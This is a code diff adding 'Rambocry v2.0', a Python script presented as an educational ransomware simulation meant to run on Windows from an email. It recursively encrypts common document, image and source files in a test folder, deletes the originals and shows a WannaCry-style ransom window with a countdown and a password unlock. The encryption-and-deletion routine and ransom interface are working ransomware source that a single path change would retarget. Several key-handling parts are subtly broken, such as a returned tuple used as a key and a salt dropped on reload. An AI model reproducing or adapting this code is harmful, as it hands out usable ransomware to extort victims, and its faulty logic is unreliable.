@@ -1,0 +1,217 @@
+# -*- coding: utf-8 -*-
+"""Rambocry v2.0 - Simulación Realista de Ransomware
+
+Simulación educativa de ransomware que encripta archivos en un directorio de prueba y muestra una GUI para desencriptarlos.
+Diseñado para ejecutarse en Windows desde un correo electrónico en un entorno controlado.
+"""
+
+import os
+import sys
+import time
+import hashlib
+import tkinter as tk
+from tkinter import messagebox, ttk
+from cryptography.fernet import Fernet
+from cryptography.hazmat.primitives import hashes
+from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
+import base64
+import logging
+
+# === CONFIGURACIÓN ===
+EXTENSIONES = [
+    '.txt', '.doc', '.docx', '.pdf', '.jpg', '.png', '.csv', '.xlsx', '.pptx', 
+    '.py', '.java', '.cpp', '.md', '.json', '.xml', '.sql', '.zip', '.rar'
+]
+TIMER_MINUTOS = 30
+ARCHIVO_CLAVE = "encryption_key.key"
+LOG_FILE = "rambocry.log"
+ENCRYPTED_EXTENSION = ".rambocry"
+
+# Configurar logging
+logging.basicConfig(filename=LOG_FILE, level=logging.INFO, 
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+
+# === GENERAR CLAVE AES Y GUARDAR ===
+def generar_clave(password: str = None) -> bytes:
+    """Genera una clave AES usando PBKDF2 y guarda la contraseña."""
+    if password is None:
+        password = Fernet.generate_key()[:16]
+    salt = os.urandom(16)
+    kdf = PBKDF2HMAC(
+        algorithm=hashes.SHA256(),
+        length=32,
+        salt=salt,
+        iterations=100000,
+    )
+    key = base64.urlsafe_b64encode(kdf.derive(password))
+    with open(ARCHIVO_CLAVE, 'wb') as f:
+        f.write(salt + key)
+    # Guardar contraseña en un archivo para el atacante
+    with open("password.txt", 'w') as f:
+        f.write(password.decode())
+    logging.info("Clave y contraseña generadas.")
+    return key, password
+
+def cargar_clave() -> bytes:
+    """Carga la clave desde el archivo."""
+    try:
+        with open(ARCHIVO_CLAVE, 'rb') as f:
+            data = f.read()
+            return data[16:]
+    except Exception as e:
+        logging.error(f"Error al cargar clave: {e}")
+        raise
+
+def verificar_integridad(archivo_path: str, datos: bytes) -> bool:
+    """Verifica la integridad del archivo usando un hash SHA256."""
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(datos)
+    hash_calculado = sha256_hash.hexdigest()
+    hash_file = f"{archivo_path}.hash"
+    if os.path.exists(hash_file):
+        with open(hash_file, 'r') as f:
+            hash_guardado = f.read()
+        return hash_calculado == hash_guardado
+    return False
+
+def guardar_hash(archivo_path: str, datos: bytes):
+    """Guarda el hash del archivo para verificar integridad."""
+    sha256_hash = hashlib.sha256()
+    sha256_hash.update(datos)
+    with open(f"{archivo_path}.hash", 'w') as f:
+        f.write(sha256_hash.hexdigest())
+
+# === CIFRAR ARCHIVOS ===
+def cifrar_archivos(ruta: str, fernet: Fernet):
+    """Cifra archivos en la ruta especificada."""
+    encrypted_files = []
+    for carpeta, _, archivos in os.walk(ruta):
+        for archivo in archivos:
+            if any(archivo.endswith(ext) for ext in EXTENSIONES):
+                archivo_path = os.path.join(carpeta, archivo)
+                try:
+                    with open(archivo_path, 'rb') as f:
+                        datos = f.read()
+                    if not verificar_integridad(archivo_path, datos):
+                        datos_cifrados = fernet.encrypt(datos)
+                        guardar_hash(archivo_path, datos)
+                        with open(archivo_path + ENCRYPTED_EXTENSION, 'wb') as f:
+                            f.write(datos_cifrados)
+                        os.remove(archivo_path)
+                        encrypted_files.append(archivo_path)
+                        logging.info(f"Archivo cifrado: {archivo_path}")
+                except Exception as e:
+                    logging.error(f"Error al cifrar {archivo_path}: {e}")
+    return encrypted_files
+
+# === DESENCRIPTAR ARCHIVOS ===
+def desencriptar_archivos(ruta: str, fernet: Fernet):
+    """Desencripta archivos en la ruta especificada."""
+    for carpeta, _, archivos in os.walk(ruta):
+        for archivo in archivos:
+            if archivo.endswith(ENCRYPTED_EXTENSION):
+                archivo_path = os.path.join(carpeta, archivo)
+                original_path = archivo_path[:-len(ENCRYPTED_EXTENSION)]
+                try:
+                    with open(archivo_path, 'rb') as f:
+                        datos = f.read()
+                    datos_descifrados = fernet.decrypt(datos)
+                    if verificar_integridad(original_path, datos_descifrados):
+                        with open(original_path, 'wb') as f:
+                            f.write(datos_descifrados)
+                        os.remove(archivo_path)
+                        os.remove(f"{original_path}.hash")
+                        logging.info(f"Archivo descifrado: {original_path}")
+                    else:
+                        logging.warning(f"Integridad comprometida: {original_path}")
+                except Exception as e:
+                    logging.error(f"Error al descifrar {archivo_path}: {e}")
+
+# === INTERFAZ TIPO WANNACRY ===
+def ventana_rescate(clave_real: bytes, encrypted_files: list):
+    """Muestra una interfaz gráfica para el proceso de desencriptación."""
+    def contar_regresivo():
+        tiempo = TIMER_MINUTOS * 60
+        while tiempo > 0:
+            mins, segs = divmod(tiempo, 60)
+            tiempo_label.config(text=f"Tiempo restante: {mins:02d}:{segs:02d}")
+            ventana.update()
+            time.sleep(1)
+            tiempo -= 1
+        messagebox.showwarning("Tiempo agotado", "¡Se acabó el tiempo!")
+        ventana.destroy()
+
+    def verificar_contrasena():
+        entrada = entrada_contrasena.get()
+        try:
+            kdf = PBKDF2HMAC(
+                algorithm=hashes.SHA256(),
+                length=32,
+                salt=clave_real[:16],
+                iterations=100000,
+            )
+            key = base64.urlsafe_b64encode(kdf.derive(entrada.encode()))
+            if key == clave_real[16:]:
+                desencriptar_archivos(ruta_documentos, Fernet(key))
+                messagebox.showinfo("Éxito", "¡Archivos restaurados correctamente!")
+                ventana.destroy()
+            else:
+                messagebox.showerror("Error", "Contraseña incorrecta")
+        except Exception as e:
+            logging.error(f"Error al verificar contraseña: {e}")
+            messagebox.showerror("Error", "Error al procesar la contraseña")
+
+    ventana = tk.Tk()
+    ventana.title("RAMBOCRY v2.0 - Pago de Rescate")
+    ventana.geometry("500x350")
+    ventana.resizable(False, False)
+    ventana.configure(bg="#f0f0f0")
+
+    estilo = ttk.Style()
+    estilo.configure("TLabel", font=("Arial", 12), background="#f0f0f0")
+    estilo.configure("TButton", font=("Arial", 10), padding=5)
+
+    texto = ttk.Label(ventana, text="¡Tus archivos han sido encriptados!\n"
+                                   "Contacta al atacante para obtener la contraseña.\n"
+                                   f"Archivos afectados: {len(encrypted_files)}", justify="center")
+    texto.pack(pady=20)
+
+    entrada_contrasena = ttk.Entry(ventana, show="*", width=40)
+    entrada_contrasena.pack(pady=10)
+
+    boton = ttk.Button(ventana, text="Desbloquear Archivos", command=verificar_contrasena)
+    boton.pack(pady=10)
+
+    tiempo_label = ttk.Label(ventana, text="")
+    tiempo_label.pack(pady=10)
+
+    ventana.after(100, contar_regresivo)
+    ventana.mainloop()
+
+# === INICIO DEL PROCESO ===
+def main():
+    """Función principal del programa."""
+    global ruta_documentos
+    ruta_documentos = os.path.join(os.environ['USERPROFILE'], 'Documents', 'test_rambocry')
+    
+    os.makedirs(ruta_documentos, exist_ok=True)
+    
+    try:
+        if not os.path.exists(ARCHIVO_CLAVE):
+            clave, password = generar_clave()
+            fernet = Fernet(clave)
+            encrypted_files = cifrar_archivos(ruta_documentos, fernet)
+        else:
+            clave = cargar_clave()
+            encrypted_files = []
+        
+        ventana_rescate(clave, encrypted_files)
+        
+        if os.path.exists(ARCHIVO_CLAVE):
+            os.remove(ARCHIVO_CLAVE)
+    except Exception as e:
+        logging.error(f"Error en el proceso principal: {e}")
+        messagebox.showerror("Error Fatal", "Ocurrió un error en la ejecución. Revisa el registro.")
+
+if __name__ == "__main__":
+    main()
